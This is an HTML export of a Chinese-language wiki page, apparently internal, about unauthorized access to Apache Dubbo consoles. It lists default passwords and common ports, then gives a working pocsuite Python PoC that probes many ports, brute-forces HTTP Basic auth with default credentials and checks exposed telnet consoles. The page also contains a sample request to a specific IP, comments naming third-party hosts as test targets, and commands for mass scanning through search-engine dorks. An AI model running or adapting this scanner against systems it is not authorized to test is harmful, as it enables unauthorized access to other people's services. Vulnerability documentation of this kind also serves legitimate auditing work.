@@ -1,0 +1,239 @@
+                    
+    
+                    
+    
+                    
+    
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>查看源</title>
+        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
+        <script>
+window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
+WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
+if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
+<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<!--[if lt IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/689a949132fabc86eace7102316c5470/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/e170a429a3ebc9c551f006bb3a0f6cb3-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/935074d6c663ad510d5b836bbc8ac279/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/e170a429a3ebc9c551f006bb3a0f6cb3-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/935074d6c663ad510d5b836bbc8ac279/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;media=print" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
+<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">
+
+    </head>
+
+    <body class="mceContentBody aui-theme-default wiki-content fullsize">
+        <p>&nbsp;</p>         <p><br /></p><h1>一、漏洞简介</h1><p><span><span><span>Dubbo是</span></span><span><sup class="bi-sup"> [1]</sup></span></span><span class="bi-link"><span class="bi-link-content"><span><span> </span></span></span></span><span><span><span> </span></span><span>阿里巴巴公司开源的一个高性能优秀的</span></span><span class="bi-link"><span class="bi-link-content"><span><span>服务框架</span></span></span></span><span><span><span>，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 </span></span><span><sup class="bi-sup">[2]</sup></span></span><span class="bi-link"><span class="bi-link-content"><span><span> </span></span></span></span><span><span><span> </span></span></span><span class="bi-link"><span class="bi-link-content"><span><span>Spring</span></span></span></span><span><span><span>框架无缝集成。其中dubbo默认的telnet和web端口应用不会对用户的身份进行校验，从而导致未授权的用户也可以访问目标网站，获取到敏感信息。此外，dubbo使用的默认密码也是容易被忽略的安全隐患。</span></span></span></p><p class="bi-heading bi-heading-two bi-dnd"><strong><span><span>Dubbo 主要核心部件</span></span></strong></p><p><span><span><br /><span><span><strong>remoting</strong>:<span><span>网络通信框架，实现了 sync-over-async 和 </span></span></span><span><span style="color: rgb(85,85,85);">Logo</span></span><span> request-response 消息机制</span></span><br /><span><span><span> </span></span></span><br /><span><span><strong class="bi-bold">RPC:</strong></span><span> 一个</span></span><span class="bi-link"><span class="bi-link-content"><span><span>远程过程调用</span></span></span></span><span><span>的抽象，支持</span></span><span class="bi-link"><span class="bi-link-content"><span><span>负载均衡</span></span></span></span><span><span>、</span></span><span class="bi-link"><span class="bi-link-content"><span><span>容灾</span></span></span></span><span><span>和</span></span><span class="bi-link"><span class="bi-link-content"><span><span>集群</span></span></span></span><span><span>功能</span></span><br /><span><span><span> </span></span></span><br /><span><span><strong class="bi-bold">Registry:</strong></span><span> 服务目录框架用于服务的注册和服务事件发布和订阅</span></span></span></span></p><p><span><span><br /><br /><strong><span><span>Dubbo建议使用Zookeeper作为服务的注册中心。</span></span></strong><br /><span><span><span> </span></span></span></span></span></p><ol class="bi-list"><li class="bi-list-node"><p><span><span>Zookeeper的作用：</span></span><br /><span><span>zookeeper用来注册服务和进行负载均衡，哪一个服务由哪一个机器来提供必需让调用者知道，简单来说就是ip地址和服务名称的对应关系。当然也可以通过硬编码的方式把这种对应关系在调用方业务代码中实现，但是如果提供服务的机器挂掉调用者无法知晓，如果不更改代码会继续请求挂掉的机器提供服务。zookeeper通过心跳机制可以检测挂掉的机器并将挂掉机器的ip和服务对应关系从列表中删除。至于支持高并发，简单来说就是横向扩展，在不更改代码的情况通过添加机器来提高运算能力。通过添加新的机器向zookeeper注册服务，服务的提供者多了能服务的客户就多了。</span></span></p><p><span><span><br /></span></span></p></li><li class="bi-list-node"><p><span><span>dubbo：</span></span></p><p><span><span>是管理中间层的工具，在业务层到数据仓库间有非常多服务的接入和服务提供者需要调度，dubbo提供一个框架解决这个问题。</span></span><span><span>注意这里的dubbo只是一个框架，至于你架子上放什么是完全取决于你的，就像一个汽车骨架，你需要配你的轮子引擎。这个框架中要完成调度必须要有一个分布式的注册中心，储存所有服务的元数据，你可以用zk，也可以用别的，只是大家都用zk。</span></span></p><p><span><span><br /></span></span></p></li><li class="bi-list-node"><p><span><span>zookeeper和dubbo的关系：</span></span></p><p><span><span> Dubbo的将注册中心进行抽象，是得它可以外接不同的存储媒介给注册中心提供服务，有ZooKeeper，Memcached，Redis等。 引入了ZooKeeper作为存储媒介，也就把ZooKeeper的特性引进来。首先是负载均衡，单注册中心的承载能力是有限的，在流量达到一定程度的时候就需要分流，负载均衡就是为了分流而存在的，一个ZooKeeper群配合相应的Web应用就可以很容易达到负载均衡；资源同步，单单有负载均衡还不够，节点之间的数据和资源需要同步，ZooKeeper集群就天然具备有这样的功能；命名服务，将树状结构用于维护全局的服务地址列表，服务提供者在启动的时候，向ZK上的指定节点/dubbo/${serviceName}/providers目录下写入自己的URL地址，这个操作就完成了服务的发布。其他特性还有Mast选举，分布式锁等。</span></span></p></li></ol><p><br /></p><h1><span style="color: rgb(74,74,74);">二、漏洞利用</span></h1><p><br /></p><p><strong>未授权的dubbo有以下几类</strong><br /><br /><span>1、直接可以访问html页面</span></p><p><span> web 端口   默认为</span><span>8080，很多其他应用</span><span>也有 改为443 等其他端口，但是未授权的问题并未得到解决。</span></p><p><span><br /></span></p><p><span>2、web控制台（使用弱口令登录）</span></p><p><span><span><span><span>web控制台采用默认登录 401 Auth登录 ，系统的默认口令如下</span></span></span></span></p><p>root / root(admin)</p><p><span>guest / guest</span></p><p><span><span><span><span>特征  ： WWW-Authenticate: Basic realm=&quot;dubbo&quot; </span></span></span></span></p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="d1f1f277-ebd0-4645-a702-d5e46453f7ff" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGV9&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>GET / HTTP/1.1
+Host: 139.224.34.203
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Authorization: Basic dGVzdDp0ZXN0</pre></td></tr></table><p><br /></p><p><span><span>dubbo的web控制台管理端口不确定，常见的有：</span></span><br /><span><span>80 443 8081 8090 9090 8088 8089 8083 8086 8888 等。</span></span><br /><br /></p><p><span><span>3、telnet 7070</span></span></p><p><span><span>默认为 7070 ssh dubbo端口，同样也有 8888、10001、20001、30001、20000等。</span></span></p><p><br /></p><h1>三、漏洞验证</h1><p>相关poc如下（pocsuite框架下使用）</p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="cf2d31d4-2b5e-463e-920e-be2d85bf4520" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGV9&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""
+Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
+See the file 'docs/COPYING' for copying permission
+"""
+# 命令行
+from pocsuite import pocsuite_cli
+# 验证模块
+from pocsuite import pocsuite_verify
+# 攻击模块
+from pocsuite import pocsuite_attack
+# 控制台模式
+from pocsuite import pocsuite_console
+# requests
+from pocsuite.api.request import req
+import urllib
+# register
+from pocsuite.api.poc import register
+# report
+from pocsuite.api.poc import Output, POCBase
+# url转换host
+from pocsuite.lib.utils.funs import url2ip
+
+
+# 基础基类
+class DubboPOC(POCBase):
+    vulID = '37'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = '1'  # 默认为1
+    vulDate = '2018-05-16'  # 漏洞公开的时间,不知道就写今天
+    author = 'songjianshan'  # PoC作者的大名
+    createDate = '2018-05-16'  # 编写 PoC 的日期
+    updateDate = '2018-05-16'  # PoC 更新的时间,默认和编写时间一样
+    references = ['http://']  # 漏洞地址来源,0day不用写
+    name = 'Dubbo Unauthorized Access'  # PoC 名称
+    appPowerLink = 'https://github.com/apache/incubator-dubbo'  # 漏洞厂商主页地址
+    appName = 'Dubbo'  # 漏洞应用名称
+    appVersion = 'all versions'  # 漏洞影响版本
+    vulType = 'Information Disclosure'  # 漏洞类型,类型参考见 漏洞类型规范表
+    desc = '''
+        Dubbo 未授权访问及默认口令
+    '''  # 漏洞简要描述
+    samples = []  # 测试样列,就是用 PoC 测试成功的网站
+    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    #cvss = u""  # 严重,高危,中危,低危
+
+    # 指纹方法
+    def _fingerprint(self):
+        pass
+
+    # 验证模块 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
+    def _verify(self):
+        # 调用指纹方法
+        result={}
+        output = Output(self)
+
+        import socket
+        import telnetlib
+        import base64
+
+        # 默认端口 web 8080 telnet 7070 但是很多dubbo自定义了端口，以下是其他比较常见的dubbo可能存在的端口
+        unauth_ports = {     #用于探测 1、直接未授权访问  2、basic 弱口令登录
+            "80",
+            "443",
+            "8080",  #default port   test demo 34.197.163.149
+            # "8081",
+            # "8082",
+            # "8083",
+            # "8084",
+            # "8086",
+            "8088",
+            "8888",
+            # "8089",
+            # "8090",
+            "8000", # default pwd test  :http://169.60.204.51:8000/
+            # "9080",
+            # "9090",
+            # "9999",
+            # "18080",
+            # "28080",
+        }
+        default_account = {   #默认账号检测  default  root/root(admin)   guest /guest
+            "root",
+            #"admin",
+            "guest",
+        }
+        default_pwd = {       #默认密码检测
+            "root" ,
+            #"admin",
+            "guest",
+        }
+        telnet_ports = {
+            "7070",    #default port  45.123.103.197
+            # "1234",
+            # "8000",
+            "10001",
+            # "9999",
+            # "19999",
+            # "29999",
+            # "20000",
+            # "18080",
+            # "28080",
+            # "6060",
+            # "8084",
+            # "12345",
+        }
+        vul_port = []
+        #step 1 http 以及弱口令
+        for p in unauth_ports:
+            url = '%s:%s' % (self.url, p)
+            try:
+                resp = req.get(str(url))
+                #print resp.text
+                if "&lt;title>dubbo&lt;/title>" in resp.text.lower() :
+                        vul_port.append(p)
+                elif resp.headers["www-authenticate"] == "Basic realm=\"dubbo\"":
+                    #print "get basic"
+                    #vul_port.append(p)
+                    #构造弱口令爆破
+                    for user in default_account:
+                        for pwd in default_pwd:
+                            verify_str = user + ":" + pwd
+                            #print verify_str
+                            verify_str = base64.b64encode(verify_str)
+                            basic_auth = {'Authorization':'BASIC '+verify_str}
+                            #print verify_str
+                            httpreq = req.session()
+                            raa = httpreq.get(url,headers=basic_auth)
+                            #print raa.text
+                            #print raa.status_code
+                            if 200 == raa.status_code:
+                                #print "get weak pwd"
+                                py = p + ':(' + user + '|' + pwd + ')'
+                                vul_port.append(py)
+            except Exception,e:
+                #print e
+                pass
+
+        #step 2 telnet
+        ip = self.url.split(':')[1].replace('/', '')
+        for i in telnet_ports:
+            try:
+                #print ip
+                #print i
+                tn = telnetlib.Telnet(ip,port=i,timeout=5)
+                tn.write("help\n")
+                if 'dubbo' in tn.read_until('dubbo'):
+                    py = i + '(telnet)'
+                    vul_port.append(py)
+            except Exception,e:
+                #print e
+                pass
+
+        if vul_port.__len__() > 0:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['url'] = self.url
+            result['VerifyInfo']['Payload'] = "port:" + str(vul_port)
+        return self.save_output(result)
+        pass
+
+    # 攻击模块
+    def _attack(self):
+        return self._verify()
+        #pass
+
+    # 输出报告
+    def save_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail()
+        return output
+
+
+# 注册类
+register(DubboPOC)
+
+"""
+PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md
+
+使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md
+
+集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md
+
+钟馗之眼 批量验证
+pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html
+pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html
+"""
+
+
+
+</pre></td></tr></table><p><br /></p><p><span><span><br /></span></span></p><p><span><span><br /></span></span></p>
+        <p>&nbsp;</p>
+    </body>
+</html>
